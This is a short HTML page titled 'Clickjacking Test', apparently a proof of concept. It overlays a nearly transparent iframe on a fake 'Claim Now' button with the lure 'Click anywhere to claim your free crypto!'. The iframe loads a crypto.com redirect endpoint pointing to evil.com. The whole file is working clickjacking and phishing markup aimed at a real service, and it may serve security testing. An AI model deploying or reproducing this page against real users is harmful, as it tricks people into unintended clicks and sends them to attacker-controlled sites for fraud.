<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Test</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        iframe {
            width: 100%;
            height: 600px;
            border: none;
            opacity: 0.1; /* Makes it almost invisible */
            position: absolute;
            top: 0;
            left: 0;
        }
        .fake-button {
            position: absolute;
            top: 250px;
            left: 50%;
            transform: translateX(-50%);
            background-color: red;
            color: white;
            font-size: 18px;
            padding: 15px 30px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h2>Click anywhere to claim your free crypto!</h2>
    <button class="fake-button">Claim Now</button>
    <iframe src="https://js.crypto.com/api/redirect?url=https://evil.com"></iframe>
</body>
</html>
